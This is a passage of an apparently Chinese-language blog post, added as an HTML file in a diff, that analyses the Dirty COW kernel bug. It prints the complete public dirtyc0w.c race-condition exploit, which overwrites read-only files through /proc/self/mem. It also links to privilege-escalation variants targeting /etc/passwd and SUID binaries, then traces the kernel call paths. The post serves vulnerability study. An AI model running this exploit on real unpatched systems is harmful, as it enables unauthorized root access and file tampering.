@@ -1,0 +1,567 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="虽然学了一阵内核pwn的利用，但是最近两次比赛都没能做出题来（太难了吧ㄒ_ㄒ，感觉新手友好的ko题不会再有了）。我还是老老实实分析分析CVE，学多点挖洞和利用技巧吧🥹。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="经典内核漏洞复现之dirtycow">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/index.html">
+<meta property="og:site_name" content="blingbling&#39;s blog">
+<meta property="og:description" content="虽然学了一阵内核pwn的利用，但是最近两次比赛都没能做出题来（太难了吧ㄒ_ㄒ，感觉新手友好的ko题不会再有了）。我还是老老实实分析分析CVE，学多点挖洞和利用技巧吧🥹。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/image-20230425175820639.png?size=600">
+<meta property="article:published_time" content="2023-05-01T18:42:59.000Z">
+<meta property="article:modified_time" content="2023-05-01T19:21:13.053Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/image-20230425175820639.png?size=600"><title>经典内核漏洞复现之dirtycow | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: undefined,
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">经典内核漏洞复现之dirtycow</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-05-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-05-02</span></span></div></header><div class="post-body">
+        <h1 id="dirtycow漏洞分析"   >
+          <a href="#dirtycow漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#dirtycow漏洞分析" class="headerlink" title="dirtycow漏洞分析"></a>dirtycow漏洞分析</h1>
+      <p>CVE-2016-9159（dirtycow）受影响的内核版本：linux 2.6.22 ~ <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions" >patched kernel versions</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://dirtycow.ninja/" >dirtycow</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>这个漏洞的原理比较复杂，但<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" >官方exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>非常简单。所以从exp入手探索背后的漏洞原理。</p>
+<p>先简单描述一下这个漏洞做了什么：</p>
+<p>对一个只读的<strong>私有映射</strong>（且是<strong>文件映射</strong>）的页面进行写操作（通过/proc/self/mem写）时，会触发copy-on-write，将page cache中的内容拷贝到cow页面。</p>
+<ul>
+<li>正常情况下，写的是cow页面，不会同步到磁盘文件。</li>
+<li>然而dirtycow漏洞可以直接映射page cache页面并写入，原本的<strong>只读文件被改写</strong>了。（可以改<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2" >/etc/passwd</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>或<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679" >带suid位的程序</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来提权）</li>
+</ul>
+
+        <h1 id="exp分析"   >
+          <a href="#exp分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h1>
+      <p>产生COW的方式有两种，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" >一种</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>是写/proc/self/mem文件，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" >另一种</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>是通过PTRACE_POKEDATA跨进程写。</p>
+<p>这里以比较经典的前者作为分析对象（前者分析明白了，后者也就能理解了），exp如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);		<span class="comment">// 竞争点：释放map对应物理页，清空页表</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);		<span class="comment">// 打开/proc/self/mem文件</span></span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);		<span class="comment">// 定位到map位置</span></span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));			<span class="comment">// 竞争点：往map位置写传入的字符串</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">  (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);		<span class="comment">// argv[1]是待写的只读文件的文件名</span></span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);		<span class="comment">// 将文件映射到进程内存中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);			<span class="comment">// 释放映射关系的线程</span></span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);		<span class="comment">// 写线程，argv[2]是待写入的字符串</span></span><br><span class="line">    </span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="调用链分析"   >
+          <a href="#调用链分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1>
+      <blockquote>
+<p>跟dirtycow漏洞相关的代码，主要集中在三个文件，这里打包保存一下：<a href="dirtycow_src.zip">dirtycow_src</a>，根据网上资料和自己的理解加了注释，方便后续回顾更改。</p>
+</blockquote>
+<p>对<code>/proc/self/mem</code>文件的读写操作，对应到fd/proc/base.c文件中的proc_mem_operations</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= mem_lseek,</span><br><span class="line">	.read		= mem_read,</span><br><span class="line">	.write		= mem_write,</span><br><span class="line">	.open		= mem_open,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+<p>dirtycow的利用中，使用的是往<code>/proc/self/mem</code>文件写，对应到内核的处理函数为<code>mem_write()</code>，因此我们跟着它一步步分析，梳理出函数调用链：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mem_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos)</span><br><span class="line">  mem_rw(file, (<span class="keyword">char</span> __user*)buf, count, ppos, <span class="number">1</span>);</span><br><span class="line">    access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">      __access_remote_vm(<span class="literal">NULL</span>, mm, addr, buf, len, write);</span><br><span class="line">        get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>, write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">          __get_user_pages_locked(tsk, mm, start, nr_pages, write, force, pages, vmas, <span class="literal">NULL</span>, <span class="literal">false</span>,FOLL_TOUCH | FOLL_REMOTE);</span><br><span class="line">            __get_user_pages(tsk, mm, start, nr_pages, flags, pages, vmas, locked);</span><br><span class="line">              find_extend_vma(mm, start);				<span class="comment">// 查找vma</span></span><br><span class="line">              follow_page_mask(vma, start, foll_flags, &amp;page_mask);		<span class="comment">// 重点</span></span><br><span class="line">              faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);		<span class="comment">// 重点</span></span><br></pre></td></tr></table></div></figure>
+<p><code>follow_page_mask()</code>：查询页表获取虚拟地址对应的物理页，如果返回NULL则调用<code>faultin_page()</code>进行缺页处理。有两种情况会返回NULL，导致触发<code>faultin_page()</code>函数：</p>
+<ol>
+<li>页表中不存在物理页即缺页</li>
+<li>访问语义标志foll_flags对应的权限违反内存页的权限时</li>
+</ol>
+<p>以上两种情况再dirtycow的利用中都会发生，因此<code>follow_page_mask()</code>和<code>faultin_page()</code>两个函数会被反复调用。接下来，我们按照时间先后顺序，分析这它们更深层次的函数调用过程。</p>
+<p>刚开始分析内核的同学可以结合 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3" >xuanxuan博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中的图片来理解，画的非常棒！</p>
+
+        <h2 id="第一次"   >
+          <a href="#第一次" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h2>
+      <blockquote>
+<p>第一次进 <code>follow_page_mask()</code>，由于页表项和页表都是空的，所以返回NULL，触发<code>faultin_page()</code>进行缺页错误处理。</p>
+<p><code>faultin_page()</code>中，根据访问flags（FOLL_WRITE）和mmap类型（VM_PRIVATE，文件映射），在物理内存上将page_cache做了一份拷贝（COW）。并使用后者建立页表，映射给进程使用。</p>
+</blockquote>
+<p> <code>follow_page_mask()</code>函数中调用链如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);			<span class="comment">// 依次解析各级页目录表，如果某级页目录表为空，会直接返回NULL</span></span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">  	pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">  	pte_present(pte);			<span class="comment">// 第一次进时，页不在内存中，且页表项为空</span></span><br><span class="line">  	<span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></div></figure>
+<p>以上函数返回后，会立即进入<code>faultin_page()</code>进行缺页错误处理：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">  handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">    __handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">      pgd_offset(mm, address);</span><br><span class="line">      pud_alloc(mm, pgd, address);</span><br><span class="line">      pmd_alloc(mm, pud, address);</span><br><span class="line">      pte_alloc(mm, pmd, address)</span><br><span class="line">      pte_offset_map(pmd, address);			<span class="comment">// 如果各级页目录项为空，则依次申请和设置</span></span><br><span class="line">      handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        do_fault(mm, vma, address, pte, pmd, flags, entry);</span><br><span class="line">    	  do_cow_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);		<span class="comment">// 写时复制的映射</span></span><br><span class="line">    	    alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line">    	    __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);		<span class="comment">// 将文件内容读到fault_page对应的页中，然后再将fault_page的内容拷贝到new_page中，相当于cow（new_page是副本）</span></span><br><span class="line">    	    copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">    	    pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">    	    do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);	<span class="comment">// 将new_page设置到页表项中，建立new_page到address地址的映射</span></span><br><span class="line">    	      mk_pte(page, vma-&gt;vm_page_prot);</span><br><span class="line">    	      maybe_mkwrite(pte_mkdirty(entry), vma);		<span class="comment">// 设置页面为dirty，但仍保持页面为RO		</span></span><br><span class="line">    	      <span class="comment">// if (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span></span><br><span class="line">			  <span class="comment">//		pte = pte_mkwrite(pte);</span></span><br><span class="line">			  page_add_new_anon_rmap(page, vma, address, <span class="literal">false</span>);</span><br><span class="line">			  set_pte_at(vma-&gt;vm_mm, address, pte, entry);</span><br><span class="line">    	    lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">  </span><br></pre></td></tr></table></div></figure>
+<p><code>do_cow_fault()</code>函数会返回0，回到<code>__get_user_pages()</code>函数中的retry标签处，再次执行<code>follow_page_mask()</code>和<code>faultin_page()</code></p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">retry:</span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);			<span class="comment">// 查询页表获取虚拟地址对应的物理页</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,				<span class="comment">// 缺页处理函数</span></span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="第二次"   >
+          <a href="#第二次" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h2>
+      <blockquote>
+<p>第二次进入<code>follow_page_mask()</code>函数，此时页表和映射关系已建立好，但由于页表标记位是read only，而访问的flags中要求写，因此会返回NULL。</p>
+<p>于是再次进入<code>faultin_page()</code>函数处理，发现是因为页表写导致的错误，于是执行写时复制（或复用之前的匿名页），然后将flags中的FOLL_WRITE清除。表示映射正常返回，后续可以强制往该页写（<code>/proc/self/mem</code>就是这么任性，只不过写的是匿名页，只在程序运行内存中有表现，不会同步回磁盘文件）。</p>
+</blockquote>
+<p>第二次进入<code>follow_page_mask()</code>函数：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">  pgd_offset(mm, address);</span><br><span class="line">  pud_offset(pgd, address);</span><br><span class="line">  pmd_offset(pud, address);</span><br><span class="line">  follow_page_pte(vma, address, pmd, flags);</span><br><span class="line">    pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">    pte_present(pte);			<span class="comment">// 第二次进时，由于上一次faultin_page中设置了页表项并且页被加载到内存中，所以会进入如下判断</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;		<span class="comment">//虽然flags中有FOLL_WRITE标记位，但页表项中却是RO，无法通过检查，因此返回NULL</span></span><br><span class="line">		pte_unmap_unlock(ptep, ptl);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></div></figure>
+<p>返回为NULL，触发<code>faultin_page()</code>处理：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking);</span><br><span class="line">  handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line">    __handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">      pgd_offset(mm, address);</span><br><span class="line">      pud_alloc(mm, pgd, address);</span><br><span class="line">      pmd_alloc(mm, pud, address);</span><br><span class="line">      pte_alloc(mm, pmd, address)</span><br><span class="line">      pte_offset_map(pmd, address);			</span><br><span class="line">      handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        <span class="comment">/* if (flags &amp; FAULT_FLAG_WRITE) &#123;</span></span><br><span class="line"><span class="comment">		if (!pte_write(entry))</span></span><br><span class="line"><span class="comment">			return do_wp_page(mm, vma, address,pte, pmd, ptl, entry);</span></span><br><span class="line"><span class="comment">			// 由于此时页表中标记位PRESENT=1，DIRTY=1，RDONLY=1，所以进入do_wp_page()函数处理流程 */</span></span><br><span class="line">		do_wp_page(mm, vma, address, pte, pmd, ptl, entry);		</span><br><span class="line">		  vm_normal_page(vma, address, orig_pte);</span><br><span class="line">		  <span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) 	<span class="comment">// 由于do_cow_fault产生的是匿名页面，因此会进入该if分支</span></span><br><span class="line">          reuse_swap_page(old_page, &amp;total_mapcount)</span><br><span class="line">		  wp_page_reuse(mm, vma, address, page_table, ptl, orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		    pte_mkyoung(orig_pte);</span><br><span class="line">		    maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">		    <span class="keyword">return</span> VM_FAULT_WRITE;</span><br><span class="line">			<span class="comment">// 由于对应VMA只读, 因此只会给PTE设置一个Dirty标志, 而不会设置RW标志, 然后返回一个VM_FAULT_WRITE（表示内核可以写入这个页）</span></span><br><span class="line">      <span class="comment">// ......一路返回到faulin_page()函数中</span></span><br><span class="line">  <span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags 